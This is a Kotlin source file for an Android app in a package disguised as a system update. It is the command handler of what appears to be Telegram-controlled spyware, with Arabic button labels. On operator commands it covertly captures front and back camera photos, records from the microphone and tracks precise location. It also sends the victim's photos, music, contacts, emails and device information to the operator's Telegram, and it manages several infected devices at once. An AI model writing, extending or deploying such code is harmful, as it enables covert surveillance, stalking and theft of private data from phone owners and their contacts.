package com.sys.update2

import android.content.Context
import android.util.Log
import java.io.File

object CommandExecutor {

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "cmd: $cmd")

        when {
            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)

            cmd == "🟢 تشغيل الصور" || cmd == "🔴 إيقاف الصور" -> togglePhotos(ctx)
            cmd == "🟢 تشغيل الموقع" || cmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx)
            cmd == "🟢 تشغيل المايك" || cmd == "🔴 إيقاف المايك" -> toggleAudio(ctx)

            cmd == "📍 عرض الموقع" -> showLocation(ctx)

            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)
            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)
            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
            cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
            cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)

            cmd == "📱 قائمة الأجهزة" -> showDeviceList(ctx)
            cmd == "🌐 كل الأجهزة" -> selectDevice(ctx, "كل الأجهزة", "all")

            cmd.startsWith("🎯 ") -> selectDevice(ctx, cmd.removePrefix("🎯 "), cmd.removePrefix("🎯 "))

            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $cmd", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun togglePhotos(ctx: Context) {
        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📸 *الصور التلقائية*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
    }

    private fun toggleLocation(ctx: Context) {
        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📍 *تتبع الموقع*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
    }

    private fun toggleAudio(ctx: Context) {
        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
        if (KeyboardBuilder.audioOn) AudioRecorder.startLoop(ctx) else AudioRecorder.stopLoop(ctx)
        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("🎤 *الميكروفون*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
    }

    private fun showDeviceList(ctx: Context) {
        runJob(ctx, "devices") {
            TelegramApi.sendMessage("📱 *جاري تحميل الأجهزة...*")
            val devices = DeviceManager.getDeviceList(ctx)
            if (devices.isEmpty()) {
                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((id, name, online) in devices) {
                val status = if (online) "🟢 متصل" else "🔴 غير متصل"
                sb.append("$status *$name*\n")
                sb.append("`$id`\n\n")
            }
            val keyboard = KeyboardBuilder.deviceListKeyboard(devices.map { it.first to it.second })
            TelegramApi.sendMessage(sb.toString(), keyboard)
        }
    }

    private fun selectDevice(ctx: Context, name: String, id: String) {
        TelegramApi.sendMessage(
            "🎯 *تم تحديد الجهاز:*\n\n*$name*\n`$id`\n\nكل الأوامر القادمة ستُنفَّذ على هذا الجهاز.",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun showMainMenu(ctx: Context) {
        TelegramApi.sendMessage("🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇", KeyboardBuilder.replyKeyboard())
    }

    private fun showDeviceInfo(ctx: Context) {
        TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx), KeyboardBuilder.replyKeyboard())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
            val loc = LocationHelper.getPreciseLocation(ctx)
            TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            sendMediaList(ctx, MediaScanner.scanImages(ctx), "📸 كل الصور")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            sendMediaList(ctx, MediaScanner.scanImages(ctx).take(n), "📸 آخر $n صورة")
        }
    }

    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
            return
        }
        var sent = 0
        var failed = 0
        for (item in list) {
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            if (TelegramApi.sendPhoto(file, item.name)) sent++ else failed++
        }
        TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
    }

    private fun fetchAllMusic(ctx: Context) {
        runJob(ctx, "music") {
            val music = MediaScanner.scanAudio(ctx)
            if (music.isEmpty()) {
                TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            TelegramApi.sendMessage("🎵 *جاري إرسال ${music.size} مقطع...*", KeyboardBuilder.replyKeyboard())
            var sent = 0
            var failed = 0
            for (m in music) {
                val file = File(m.path)
                if (!file.exists()) { failed++; continue }
                if (TelegramApi.sendAudio(file, "🎵 ${m.name}")) sent++ else failed++
                Thread.sleep(300)
            }
            TelegramApi.sendMessage("🎵 *انتهى*\n\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية 🤳" else "خلفية 📸"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 صورة ($label)")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    private fun fetchContacts(ctx: Context) {
        runJob(ctx, "contacts") {
            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                if (c.emails.isNotEmpty()) sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                sb.append("\n")
                count++
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
                if (count >= 150) { sb.append("… +${contacts.size - count} آخرين\n"); break }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEmails(ctx: Context) {
        runJob(ctx, "emails") {
            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) {
                TelegramApi.sendMessage(
                    "📭 لا توجد إيميلات\n\n⚠️ تأكد من صلاحية جهات الاتصال",
                    KeyboardBuilder.replyKeyboard()
                )
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for (e in emails) {
                sb.append("✉️ *${e.name}*\n`${e.email}`\n\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(400)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(400)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(400)
            sendMediaList(ctx, MediaScanner.scanImages(ctx).take(30), "📸 الصور")
            Thread.sleep(400)
            fetchContacts(ctx)
            Thread.sleep(400)
            fetchEmails(ctx)
            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ: ${e.message}", KeyboardBuilder.replyKeyboard())
            }
        }.start()
    }
}
